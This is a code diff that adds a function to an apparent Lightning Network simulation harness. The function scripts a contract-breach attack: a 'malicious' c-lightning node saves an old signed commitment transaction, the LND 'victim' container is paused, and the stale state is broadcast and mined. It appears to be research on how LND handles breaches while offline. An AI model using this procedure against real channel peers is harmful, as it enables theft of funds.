@@ -371,5 +371,116 @@ def Eclair():
 	f.close()
 
 
+def LNDWithTimeDown():
+
+
+	##Attack to LND node but it goes offline when the commitment transaction is broadcasted
+
+	#SIMPLE CONTRACT BREACH ATTACK SIMULATION ON LND VICTIM
+	#ASSIGN POLAR SCENARIO TO 1
+
+
+	# 1. Identify all nodes and save in easy variables to use
+	for i in NODE_LIST:
+		if i.implementation == 'lnd':
+			victim = i
+		elif i.implementation == 'lightningd':
+			malicious = i
+		else:
+			bitcoin_core = i
+
+	# 2. Get Funding Transaction id and raw
+
+	fundingTransactionID = victim.getFundingTransactionID()
+	fundingTransactionRAW = bitcoin_core.getRawTransaction(fundingTransactionID)
+	
+	# 2. Initialize the results file
+
+	FOLDER = RESULTS_PATH + 'victim_LND_offline'
+	os.mkdir(FOLDER)
+	file_name = FOLDER + '/results.txt'
+	f = open(file_name, "w")
+	f.write("LND VICTIM NODE IMPLEMENTATION\n")
+	f.write("SIMULTAION TIME " + str(DATE) +'\n')
+
+	f.write("\n\nFunding Transaction: \n")
+	f.write("   " + fundingTransactionRAW + "\n\n\n")
+
+
+	victimBalance = 0
+	maliciousBalance = 250000
+	f.write("INITIAL STATE:\n")
+	f.write("Victim balance: " + str(victimBalance) + '\n')
+	f.write("Malicious balance: " + str(maliciousBalance) + '\n')
+
+	
+	# 3. Malicious pays 100k sats to victim
+
+	invoice = victim.createInvoice(100000)
+	res = malicious.payInvoice(invoice)
+	if res:
+		print('Payment completed')
+
+	victimBalance += 100000
+	maliciousBalance -= 100000
+	f.write("\n\nMalicious pays 100k sats to victim\n")
+	f.write("  Victim balance: " + str(victimBalance) + "\n")
+	f.write("  Malicious balance: " + str(maliciousBalance) + "\n")
+
+	peerId = malicious.getPeersIds()[0]
+	commitmentTx = malicious.signLastTx(peerId)
+	f.write("  Commitment raw TX: \n   " + commitmentTx)
+
+
+	# 4. Victim pays 50k sats to malicious
+	invoice = malicious.createInvoice(50000)
+	res = victim.payInvoice(invoice)
+	if res:
+		print('Payment completed')
+
+	victimBalance -= 50000
+	maliciousBalance += 50000
+	f.write("\n\nVictim pays 50k sats to malicious\n")
+	f.write("  Victim balance: " + str(victimBalance) + "\n")
+	f.write("  Malicious balance: " + str(maliciousBalance) + "\n")	
+
+
+	# 5. Malicious save this commitment transaction
+	fraudCommitmentTx = malicious.signLastTx(peerId)
+	f.write("  Commitment raw TX: \n   " + fraudCommitmentTx)
+
+
+	#6. Malicous pays 40k sats to victim
+	invoice = victim.createInvoice(40000)
+	res = malicious.payInvoice(invoice)
+	if res:
+		print('Payment completed')
+
+	victimBalance += 40000
+	maliciousBalance -= 40000
+	f.write("\n\nMalicious pays 40k sats to victim\n")
+	f.write("  Victim balance: " + str(victimBalance) + "\n")
+	f.write("  Malicious balance: " + str(maliciousBalance) + "\n")	
+
+	commitmentTx = malicious.signLastTx(peerId)
+	f.write("  Commitment raw TX: \n   " + commitmentTx)
+
+	
+
+	#7. Victim containers pause
+
+	victim.pause()
+
+	#8. Malicious broadcast previous state
+	res = bitcoin_core.sendRawTransaction(fraudCommitmentTx)
+	f.write("\n\nMalicious broadcast previous state\n")
+	f.write("  Commitment transaction hash in hex: \n  " + res)
+
+
+	bitcoin_core.mineNewBlocks(10)
+	print("Finished")
+
+
+
 if __name__ == "__main__":
-	Eclair()
+	LNDWithTimeDown()
